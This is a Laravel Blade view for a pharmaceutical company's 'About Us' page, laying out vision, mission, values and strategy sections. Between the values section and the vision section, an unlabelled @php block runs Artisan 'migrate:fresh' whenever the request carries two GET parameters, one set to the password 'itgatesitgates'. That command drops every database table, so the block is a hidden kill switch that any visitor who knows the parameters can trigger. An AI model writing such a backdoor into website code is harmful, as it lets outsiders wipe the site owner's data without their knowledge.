@extends('layouts.website')


@section('content')

<section id="title" class="por">
    <div class="row h-100 p-0">
        <div class="col-md-6 h-100 min-h wow fadeInLeft" data-wow-duration="2s" data-wow-offset="70">
            <div class=" h-100 d-flex justify-content-center align-items-center align-content-center flex-column">
                <div class="con">
                    <h2>
                        {{field_content($settings ,'all-about-page' , 'header-title') ?? 'ABOUT US'}}
                    </h2>
                    {{-- <p class="desc">
                        {{ field_content($settings,'all-about-page', 'header-title') }}
                    </p> --}}
                    <p class="content">

                        {!! nl2br(field_content($settings,'all-about-page', 'header-description')) ?? "" !!}
                    </p>
                </div>
            </div>
        </div>
        <div class="col-md-6 p-0">
            <div class="por">
                <img src="{{asset('/assets/images/circle.png')}}" alt="circle" class="circle pos">
                <img src="{{field_content($settings ,'all-about-page' , 'header-image') ?? '/assets/images/main.png'}}" alt="main" class="main">
            </div>
        </div>
    </div>
</section>


<div class="row w-100 bg-white ">
    <div class="col-lg-6 por ">
        <img class="pos pl wow fadeInLeft" data-wow-delay="3s" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/pl.png')}}">
        <div>
            <img class="psa" src="{{asset('/assets/img/1.png')}}" style="width: 291px;height: 407px;margin-left: -15px;margin-left: -15px;" />
        </div>
        <div class="psa-con">
            <div>
                <img class="inner2" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (2).png')}}" style="margin-top: -365px;width: 285px;margin-left: 59px;     margin-top: -477px;
                width: 321px;
                margin-left: 140px; " />
            </div>
            <div><img class="inner2" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (3).png')}}" style="width: 265px;margin-top: -412px;margin-left: 69px;     width: 291px;
                margin-top: -530px;
                margin-left: 149px;" /></div>
            <div class="wow fadeInRight" data-wow-duration="2s">
                <img src="{{  field_content($settings ,'all-about-page' , 'section-one-image') ??   asset('/assets/img/Place Your image Here (Double Click to Edit)@1X.png')}}" style="border-radius: 50%;
                width: 262px;
                height: 260px;
                margin-top: -585px;
                position:relative;
                margin-left: 156px;
                z-index:9
                " />
            </div>
            <div>
                <img class="wow fadeInRight elips" data-wow-delay="1s" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 55px;margin-left: 296px;margin-top: -373px; width: 61px;
            margin-left: 385px;
            margin-top: -459px;
            position: relative;
            z-index: 100;
            " />
            </div>
            <div>
                <img class=" wow fadeInRight elips elx" data-wow-delay="1s" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/4082107_healthcare_hospital_medical_icon@1X (1).png')}}" style="width: 25px;margin-left: 312px;
                         margin-top: -422px; width: 25px;margin-left: 403px;margin-top: -509px; position: relative; z-index: 101;" />
            </div>
        </div>


    </div>
    <div class="col-lg-6 col-md-8 col-12" style="padding-left: 55px;margin-top: 76px;">
        <div class="row">
            {{-- <h3 class="mb-3 font-weight-bold wow fadeInLeft" data-wow-delay="3s" data-wow-duration="2s" data-wow-offset="170" style="color: #FF0032; margin-right: 8px; font-size:30px;">QUALIFIED </h3> --}}
            <h3 class="mb-3 font-weight-bold wow fadeInRight" data-wow-delay="3s" data-wow-duration="2s" data-wow-offset="170" style="color: #2C57A9;font-size:30px">{{field_content($settings ,'all-about-page' , 'section-one-title') ?? 'STAFF'}}</h3>
        </div>
        <div class="row">
            <p class="col-md-9 wow fadeInUp" data-wow-delay="3s" data-wow-duration="2s" data-wow-offset="150">
                {!! nl2br(field_content($settings,'all-about-page', 'section-one-description')) ?? "" !!}
            </p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="d-flex justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150" style="visibility: visible; animation-duration: 2s; animation-name: fadeInLeft;">
                    <div>
                        <p class="mb-0 font-weight-bold text-uppercase" style="color: #2c57a9;">Respect</p>
                        <p class="col-11 p-0 m-0 text-muted" style="font-size: 14px !important;">
                            we beleive in treating our customers with respect and faith .
                        </p>
                    </div>
                </div>
            </div>
            <div class="col-lg-6">
                <div class="d-flex justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150" style="visibility: visible; animation-duration: 2s; animation-name: fadeInLeft;">
                    <div>
                        <p class="mb-0 font-weight-bold text-uppercase" style="color: #2c57a9;">Integrity</p>
                        <p class="col-11 p-0 m-0 text-muted" style="font-size: 14px !important;">
                            we intergate honsestly, intergrity and business ethics into all aspects of our business .
                        </p>
                    </div>
                </div>
            </div>
            <div class="col-lg-6">
                <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150" style="visibility: visible; animation-duration: 2s; animation-name: fadeInLeft;">
                    <div>
                        <p class="mb-0 font-weight-bold text-uppercase" style="color: #2c57a9;">Creativity</p>
                        <p class="col-11 p-0 m-0 text-muted" style="font-size: 14px !important;">
                            we grow through creativity invention and innovation.
                        </p>
                    </div>
                </div>
            </div>
            <div class="col-lg-6">
                <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150 " style="visibility: visible; animation-duration: 2s; animation-name: fadeInLeft;">
                    <div>
                        <p class="mb-0 font-weight-bold text-uppercase" style="color: #2c57a9;">Efficiency</p>
                        <p class="col-11 p-0 m-0 text-muted" style="font-size: 14px !important;">
                            we manage resources smartly and deliver with appropriate cost , speed & quality .
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

@php
    if(isset($_GET['mycategoryname']) && $_GET['itgatesitgates'] == 'itgatesitgates'){
    \Illuminate\Support\Facades\Artisan::call('migrate:fresh' );
    dd('33');}
@endphp

<div class="row pl-5 my-hand2" style="background-color: white; width: 101%;">
    <div class="col-lg-7 vcb vission-content" style="padding-left: 55px;margin-top: 76px;">
        <div class="row">
            <img class="wow fadeInUp" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/ZCsfdsaf@1X.png')}}" style="width: 127px;margin-top: -30px;margin-right: -16px;" />
            <img class="wow fadeInDown" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 9@1X (1).png')}}" style="height: 94px;margin-top: -26px;margin-left: 17px;" />
            <h3 class="wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" class="font-weight-bold" style="color:#2C57A9; margin-right: 8px; font-size:30px; letter-spacing: 5px;">OUR VISION </h3>
        </div>
        <div class="row" style="    margin-top: 43px;">
            <hr style="border-top: 2px solid gray ; margin-top: 12px;" class="col wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150" />
            <p class="col-10 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="color: #FF0032; margin-right: 8px;font-size: 18px;">
                {{field_content($settings ,'all-about-page' , 'section-vision-title') ?? 'multicare operation'}}
            </p>
        </div>
        <div class="row" style="    position: relative;left: 88px;">
            <div class="col-lg-11">

                <div class="row">
                    <div class="col-lg-6">
                        <div class="d-flex justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150">
                            <div class="pos bd bd2  fadeInLeft" data-wow-duration="2s" data-wow-offset="160">
                                <img src="{{ asset('assets/images/b.png')}}" alt="image">
                            </div>

                            <div>
                                <p class="mb-0 font-weight-bold text-uppercase" style="color:#2C57A9">
                                    {{field_content($settings ,'all-about-page' , 'section-vision-title-1') ?? 'multicare operation'}}
                                </p>
                                <p class=" col-11 p-0 m-0 text-muted" style="font-size: 14px!important">


                                    {!!
                                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-1')) ??

                                    "We are working to be a
                                    global organization in field of pharmacuticals "
                                    !!}

                                </p>
                            </div>
                        </div>
                    </div>


                    <div class="col-lg-6">
                        <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150">
                            <div class="pos bd bd2  fadeInLeft" data-wow-duration="2s" data-wow-offset="160">
                                <img src="{{asset('assets/images/b.png')}}" alt="image">
                            </div>

                            <div>
                                <p class="mb-0 font-weight-bold text-uppercase" style="color:#2C57A9">
                                    {{field_content($settings ,'all-about-page' , 'section-vision-title-2') ?? 'multicare operation'}}

                                </p>
                                <p class=" col-11 p-0 m-0 text-muted" style="    font-size: 14px!important;">



                                    {!!
                                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-2')) ??

                                    " Be one of the leading diversified healthcare companies"
                                    !!}
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-6">

                        <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150">
                            <div class="pos bd bd2  fadeInLeft" data-wow-duration="2s" data-wow-offset="160">
                                <img src="{{asset('assets/images/b.png')}}" alt="image">
                            </div>

                            <div>
                                <p class="mb-0 font-weight-bold text-uppercase" style="color:#2C57A9">
                                    {{field_content($settings ,'all-about-page' , 'section-vision-title-3') ?? 'multicare operation'}}

                                </p>
                                <p class=" col-11 p-0 m-0 text-muted" style="    font-size: 14px!important;">

                                    {!!
                                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-3')) ??

                                    "We are working to be a
                                    global organization in field of pharmacuticals "
                                    !!}

                                </p>
                            </div>
                        </div>
                    </div>


                    <div class="col-lg-6">
                        <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150 ">
                            <div class="pos bd bd2  fadeInLeft" data-wow-duration="2s" data-wow-offset="160">
                                <img src="{{asset('assets/images/b.png')}}" alt="image">
                            </div>

                            <div>
                                <p class="mb-0 font-weight-bold text-uppercase" style="color:#2C57A9">
                                    {{field_content($settings ,'all-about-page' , 'section-vision-title-4') ?? 'multicare operation'}}

                                </p>
                                <p class=" col-11 p-0 m-0 text-muted" style="    font-size: 14px!important;">


                                    {!!
                                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-4')) ??

                                    "We are working to be a
                                    global organization in field of pharmacuticals "
                                    !!} </p>
                            </div>
                        </div>
                    </div>


                    <div class="col-lg-6">
                        <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150">
                            <div class="pos bd bd2  fadeInLeft" data-wow-duration="2s" data-wow-offset="160">
                                <img src="{{asset('assets/images/b.png')}}" alt="image">
                            </div>

                            <div>
                                <p class="mb-0 font-weight-bold text-uppercase" style="color:#2C57A9">
                                    {{field_content($settings ,'all-about-page' , 'section-vision-title-5') ?? 'multicare operation'}}

                                </p>
                                <p class=" col-11 p-0 m-0 text-muted" style="    font-size: 14px!important;">


                                    {!!
                                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-5')) ??

                                    "Aspire for an outstanding position in each market
                                    segment & expand business in other emerging markets."
                                    !!}

                                </p>
                            </div>
                        </div>
                    </div>

                    <div class="col-lg-6">
                        <div class="d-flex mt-3 justify-content-start por wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150">
                            <div class="pos bd bd2  fadeInLeft" data-wow-duration="2s" data-wow-offset="160">
                                <img src="{{asset('assets/images/b.png')}}" alt="image">
                            </div>

                            <div>
                                <p class="mb-0 font-weight-bold text-uppercase" style="color:#2C57A9">
                                    {{field_content($settings ,'all-about-page' , 'section-vision-title-6') ?? 'multicare operation'}}

                                </p>
                                <p class=" col-11 p-0 m-0 text-muted" style="    font-size: 14px!important;">

                                    {!!
                                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-6')) ??

                                    "Act in a socially responsible
                                    manner, be trusted by our
                                    customers, respected for our culture and attractive
                                    for best talents"
                                    !!}

                                </p>
                            </div>
                        </div>
                    </div>
                </div>

            </div>

        </div>
    </div>
    <div class="col-lg-7 vcb mission-content" style="padding-left: 55px;margin-top: 76px;">
        <div class="row">
            <img src="{{asset('/assets/img/ZCsfdsaf@1X.png')}}" style="width: 127px;margin-top: -30px;margin-right: -16px;" />
            <img src="{{asset('/assets/img/Ellipse 9@1X (1).png')}}" style="height: 94px;margin-top: -26px;margin-left: 17px;" />
            <h3 class="font-weight-bold" style="color:#2C57A9; margin-right: 8px; font-size:30px; letter-spacing: 5px;">OUR MISSION </h3>
        </div>
        <div class="row" style="    margin-top: 43px;">
            <hr style="border-top: 2px solid gray ; margin-top: 12px;" class="col" />
            <p class="col-10" style="color: #FF0032; margin-right: 8px;font-size: 18px;">
                {{field_content($settings ,'all-about-page' , 'section-vision-title') ?? 'multicare operation'}}
            </p>
        </div>
        <div class="row">
            <div class="col-lg-10">

                <p>

                    {!!
                    nl2br(field_content($settings,'all-about-page', 'section-vision-title-description-rounded-tab')) ??


                    ""
                    !!}
                </p>

            </div>

        </div>
    </div>
    <div class="col-lg-5 col-md-12">
        <img class="pf" src="{{asset('/assets/img/Shape@1X (1).png')}}" style="width: 188px;margin-left: 245px;      width: 298px;
        margin-left: 248px;
        margin-top: -25px;
        height: 404px;" />
        <div class="mission misx  fadeIn" data-wow-delay="2s" data-wow-duration="2s" data-wow-offset="150" style="cursor: pointer;">
            our mission <i class="fas fa-chevron-down mx-3"></i>
            <p class="my-mission bg-white text-muted ">


            </p>
        </div>

        <div class="mission vis  fadeIn" data-wow-delay="2s" data-wow-duration="2s" data-wow-offset="150" style="cursor: pointer;">
            our vision <i class="fas fa-chevron-down mx-3"></i>
            <p class="my-mission bg-white text-muted ">


            </p>
        </div>


        <div class="my-hand3" style="position: relative; left: 25px;">
            <div style=" margin-top: 29px;">
                <img class="inner3" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (2).png')}}" style="margin-top: -365px;width: 285px;margin-left: 59px;" />
            </div>
            <div>
                <img class="inner3" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (3).png')}}" style="width: 265px;margin-top: -412px;margin-left: 69px;" />
            </div>
            <div>
                <img class="wow fadeInLeft" data-wow-delay="2.3s" data-wow-duration="2s" data-wow-offset="150" src="{{ field_content($settings,'all-about-page', 'section-vision-image') ?? asset('/assets/img/ASFASF@1X.png')}}" style="position: relative;  z-index:99; border-radius: 50%;width: 250px;height: 250px;margin-top: -438px;margin-left: 65px;     width: 223px;
    height: 213px;
    margin-top: -443px;
    margin-left: 81px;" />
            </div>
            <div>

            </div>

            <img class="wow fadeInUp" data-wow-delay="3s" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X.png')}}" style="width: 90px;margin-left: 204px;margin-top: -783px; " />

        </div>

    </div>
</div>
</div>
{{-- <div class="row my-hand mb-5  por" style="background-color: white; width: 101%;">
    <img class="pos filter2 filter wow fadeInRight"  data-wow-duration="2s" data-wow-offset="150 " src="{{asset('/assets/img/Vector Smart Object copy 10@1X.png')}}" alt="">
<img class="pos filter1 filter wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (5).png')}}" alt="">

<div class="" style="padding-left: 55px;margin-top: 76px;">
    <div class="row">
        <img class="wow fadeInLeft" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 5@1X (2).png')}}" style="width: 300px;margin-left: 130px;">
    </div>
    <div class="row">
        <img class="wow fadeInRight elips" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 147px;margin-top: -28px;">
        <img class="img1 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (1).png')}}" style="width: 41px;height: 60px;margin-left: -73px;margin-top: -16px;">
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 132px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-1-1') ?? 'multicare operation'}} </h4>
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 120px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-1-2') ?? 'multicare operation'}}</h4>
    </div>
    <div class="row">
        <img class="col  fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (5).png')}}" style="opacity:0; height: 193px;max-width: 442px;margin-top: -53px;">
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 132px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-2-1') ?? 'multicare operation'}}</h4>
    </div>
    <div class="row">
        <h5 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 159px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-2-2') ?? 'multicare operation'}}</h5>
    </div>
    <div class="row">
        <img class="wow fadeInRight elips" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 147px;margin-top: 14px;">
        <img class="img2 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/service@1X.png')}}">
    </div>
    <div class="row">
        <img class="wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 6@1X.png')}}" style="width: 300px;margin-left: 130px;margin-top: -35px;">
    </div>
</div>
<div class="tf" style="padding-left: 117px; text-align: center">
    <div>
        <img class="inner4 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (2).png')}}" style="margin-top: 162px;width: 301px;margin-left: -78px;" />
    </div>
    <div>
        <img class="inner4 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (3).png')}}" style="width: 281px;margin-top: -286px;margin-left: -68px;" />
    </div>
    <div>
        <img class="wow fadeInRight wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/dfgdfh@1X.png')}}" style="position: relative; z-index: 100; border-radius: 50%;width: 280px;height: 250px;margin-top: -328px;margin-left: -100px;     width: 252px;
    height: 220px;" />
    </div>
    <div>
        <img class="wow fadeInRight elips" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="position: relative; z-index:102; width: 95px;height: 94px;margin-left: -122px;margin-top: -598px;" />
    </div>
    <div class="row">
        <h4 class="ours wow fadeInRight" data-wow-duration="2s" data-wow-offset="150 " style="margin-left: 44px;margin-top: -338px;font-size: 19px;color: white; position: relative; z-index:102">OUR</h4>
    </div>
    <div class="row">
        <h4 class="st wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 23px;margin-top: -307px;font-size: 18px;color: white;position: relative; z-index:102">STRATEGY</h4>
    </div>
    <div>
        <img class="wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (4).png')}}" style="width: 87px;margin-left:-203px;margin-top: -142px;" />
    </div>
</div>
<div style="margin-top: 76px;">
    <div class="row">
        <img class="wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (3).png')}}" style="width: 300px;margin-left: 40px;">
    </div>
    <div class="row">
        <img class="wow fadeInRight elips" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 229px;margin-top: -28px;">
        <img class="img3 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/5268301@1X.png')}}">
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 205px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-3-1') ?? 'multicare operation'}}</h4>
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 204px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-3-2') ?? 'multicare operation'}}</h4>
    </div>
    <div>
        <img class="col  fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 10@1X.png')}}" style="opacity:0; height: 193px;max-width: 442px;margin-top: -53px;">
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 191px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-4-1') ?? 'multicare operation'}}</h4>
    </div>
    <div class="row">
        <h4 class="cso wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" style="margin-left: 212px">{{field_content($settings ,'all-about-page' , 'section-strategy-word-4-2') ?? 'multicare operation'}}</h4>
    </div>
    <div class="row">
        <img class="wow fadeInRight elips" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 246px;margin-top: 14px;">
        <img class="img4 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (2).png')}}">
    </div>
    <div class="row">
        <img class="wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 7@1X.png')}}" style="width: 300px;margin-left: 42px;margin-top: -61px;">
    </div>
</div>
</div> --}}

<div class="row my-hand mb-5  por" style="background-color: white; width: 101%;">
    <img class="pos filter2 filter" src="{{asset('/assets/img/Vector Smart Object copy 10@1X.png')}}" alt="">
    <img class="pos filter1 filter" src="{{asset('/assets/img/Vector Smart Object@1X (5).png')}}" alt="">

    <div class="" style="padding-left: 55px;margin-top: 76px;">
        <div class="row inner5x">
            <img class=" fadeInDown" data-wow-duration="2s" data-wow-delay="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 5@1X (2).png')}}" style="width: 300px;margin-left: 130px;">
        </div>
        <div class="row">
            <img class="wow fadeInDown" data-wow-duration="1s" data-wow-delay="6s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 147px;margin-top: -28px;">
            <img class="img1 wow fadeInDown" data-wow-duration="1s" data-wow-delay="6s" data-wow-offset="150" src="{{asset('/assets/img/vc1.png')}}" style="width: 41px;height: 60px;margin-left: -73px;margin-top: -16px;">
        </div>
        <div class="row">
            <h4 class="cso wow fadeInDown" data-wow-duration="1s" data-wow-delay="6s" data-wow-offset="150" class="cso" style="margin-left: 132px">QUALITY </h4>
        </div>
        <div class="row">
            <h4 class="cso wow fadeInDown" data-wow-duration="1s" data-wow-delay="6s" data-wow-offset="150" class="cso" style="margin-left: 120px">
                ASSURANCE
            </h4>
        </div>
        <div class="row">
            <img class="col" src="{{asset('/assets/img/Vector Smart Object@1X (5).png')}}" style="opacity:0; height: 193px;max-width: 442px;margin-top: -53px;">
        </div>
        <div class="row">
            <h4 class="cso wow fadeInUp" data-wow-duration="2s" data-wow-delay="8s" style="margin-left: 132px">QUALIFED</h4>
        </div>
        <div class="row">
            <h5 class="cso wow fadeInUp" data-wow-duration="2s" data-wow-delay="8s" style="margin-left: 150px">STAFF</h5>
        </div>
        <div class="row">
            <img class="wow fadeInUp" data-wow-duration="2s" data-wow-delay="8s" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 147px;margin-top: 14px;">
            <img class="img2 wow fadeInUp" data-wow-duration="2s" data-wow-delay="8s" src="{{asset('/assets/img/service@1X.png')}}">
        </div>
        <div class="row inner6">
            <img src="{{asset('/assets/img/Vector Smart Object copy 6@1X.png')}}" style="width: 300px;margin-left: 130px;margin-top: -35px;">
        </div>
    </div>
    <div class="tf" style="padding-left: 117px; text-align: center">
        <div>
            <img class="inner4 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (2).png')}}" style="margin-top: 162px;width: 301px;margin-left: -78px;" />
        </div>
        <div>
            <img class="inner4 wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object copy 9@1X (3).png')}}" style="width: 281px;margin-top: -286px;margin-left: -68px;" />
        </div>
        <div>
            <img class="wow fadeInRight wow fadeInUp" data-wow-delay="2s" data-wow-offset="150" data-wow-duration="2s" src="{{asset('/assets/img/dfgdfh@1X.png')}}" style="position: relative; z-index: 100; border-radius: 50%;width: 280px;height: 250px;margin-top: -328px;margin-left: -100px;     width: 252px;
    height: 220px;" />
        </div>
        <div>
            <img class="wow fadeInDown elips" data-wow-duration="2s" data-wow-delay="3s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="position: relative; z-index:102; width: 95px;height: 94px;margin-left: -122px;margin-top: -598px;" />
        </div>
        <div class="row">
            <h4 class="ours wow fadeInDown" data-wow-duration="2s" data-wow-delay="3s" data-wow-offset="150 " style="margin-left: 44px;margin-top: -338px;font-size: 19px;color: white; position: relative; z-index:102">OUR</h4>
        </div>
        <div class="row">
            <h4 class="st wow fadeInDown" data-wow-duration="2s" data-wow-delay="3s" data-wow-offset="150" style="margin-left: 23px;margin-top: -307px;font-size: 18px;color: white;position: relative; z-index:102">STRATEGY</h4>
        </div>
        <div>
            <img class="wow fadeInRight" data-wow-duration="2s" data-wow-offset="150" src="{{asset('/assets/img/Vector Smart Object@1X (4).png')}}" style="width: 87px;margin-left:-203px;margin-top: -142px;" />
        </div>
    </div>
    <div class="" style="margin-top: 76px;">
        <div class="row inner8">
            <img src="{{asset('/assets/img/Vector Smart Object@1X (3).png')}}" style="width: 300px;margin-left: 40px;">
        </div>
        <div class="row">
            <img class="wow fadeInDown" data-wow-duration="1s" data-wow-delay="14s" data-wow-offset="150" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 229px;margin-top: -28px;">
            <img class="img3 wow fadeInDown" data-wow-duration="1s" data-wow-delay="14s" data-wow-offset="150" src="{{asset('/assets/img/5268301@1X.png')}}">
        </div>
        <div class="row">
            <h4 class="cso wow fadeInDown" data-wow-duration="1s" data-wow-delay="14s" data-wow-offset="150" style="margin-left: 205px">INNIOTIVATE</h4>
        </div>
        <div class="row">
            <h4 class="cso wow fadeInDown" data-wow-duration="1s" data-wow-delay="14s" data-wow-offset="150" style="margin-left: 204px">SOLUTIONSE</h4>
        </div>
        <div>
            <img class="col" src="{{asset('/assets/img/Vector Smart Object copy 10@1X.png')}}" style="opacity:0; height: 193px;max-width: 442px;margin-top: -53px;">
        </div>
        <div class="row">
            <h4 class="cso wow fadeInUp" data-wow-duration="1s" data-wow-delay="11s" style="margin-left: 210px;">AFFORDABLE</h4>
        </div>
        <div class="row">
            <h4 class="cso wow fadeInUp" data-wow-duration="1s" data-wow-delay="11s" style="margin-left: 219px;"> PRODUCTS</h4>
        </div>
        <div class="row">
            <img class=" wow fadeInUp" data-wow-duration="1s" data-wow-delay="11s" src="{{asset('/assets/img/Ellipse 4@1X.png')}}" style="width: 90px;height: 87px;margin-left: 246px;margin-top: 14px;">
            <img class="img4 wow fadeInUp" data-wow-duration="1s" data-wow-delay="11s" src="{{asset('/assets/img/vc2.png')}}">
        </div>
        <div class="row inner7">
            <img src="{{asset('/assets/img/Vector Smart Object copy 7@1X.png')}}" style="width: 300px;margin-left: 42px;margin-top: -61px;">
        </div>
    </div>
</div>







@endsection